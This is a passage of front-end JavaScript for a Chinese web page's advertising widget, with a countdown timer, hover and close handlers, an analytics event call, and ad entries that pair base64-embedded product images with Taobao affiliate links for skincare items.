                        // + (mm > 0 ? '<em>' + mm + '</em>分' : '')
                        // + (ss >= 0 ? '<em>' + ss + '</em>秒' : '');
                        timeArea.html(timeStr);
                    }
                }
            } else {
                timeArea.html("即将过期");
            }
        }                                 //倒计时器
        function trim(str) {
            return str.replace(/^(\s|\u00A0)+/,'').replace(/(\s|\u00A0)+$/,'');
        }                                    // 去掉字符串前后空格
        cnzzAppend(function () {cnzzEvent("MID展示","展示");});
        !function () {
            var qqUrl = Math.floor(Math.random() * consult.length);
            qqUrl = consult[qqUrl];
            $(".plugMid627-QQ a").attr("href",qqUrl);
        }();                                       //随机咨询群链接
        !function () {
            var times = null;
            $(".plugMid627-AD .plugMid627-drop").not($(".qrCode")[0]).width($("#plugMid627").width());
            $(window).on("resize",function () {
                $(".plugMid627-AD .plugMid627-drop").not($(".qrCode")[0]).width($("#plugMid627").width());
            });
            $("#plugMid627").on("mouseenter",".plugMid627-AD,.plugMid627-set",function () {
                var that = $(this);
                times = setTimeout(function () {
                    that.children(".plugMid627-drop").show();
                    that.css("border-bottom","1px solid transparent");
                },300)
            });
            $("#plugMid627").on("mouseleave",".plugMid627-AD,.plugMid627-set",function () {
                clearInterval(times);
                $(this).children(".plugMid627-drop").hide();
                $(this).css("border-bottom","1px solid #ECECEC");
            });
            $("#plugMid627").on("click",".plugMid627-close",function () {
                $("#plugMid627").remove();
            });
        }();                                       //中间移入展示,点击关闭事件绑定
        /*new Typed("#midTq-qiPao",{
         strings:['6.18买买买'],
         typeSpeed:100,
         backSpeed:0,
         backDelay:500,
         startDelay:1000,
         loop:true,
         });     *///打字机
        !function () {
            var adData = {
                ad1:{
                    pic:'data:image/jpeg;base64,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',
                    title:'买水乳送蚕丝面膜',
                    icon:'爆款',
                    url:'https://s.click.taobao.com/AXIq6Pw',
                    type:2,
                    desc:'荐！6月特惠！韩国德妃紫苏EGF修复再生水乳套装200ml爽肤水乳液',
                    price:139,
                    index:1,
                    cnzzName:'广告1'
                },
                ad2:{
                    pic:'data:image/jpeg;base64,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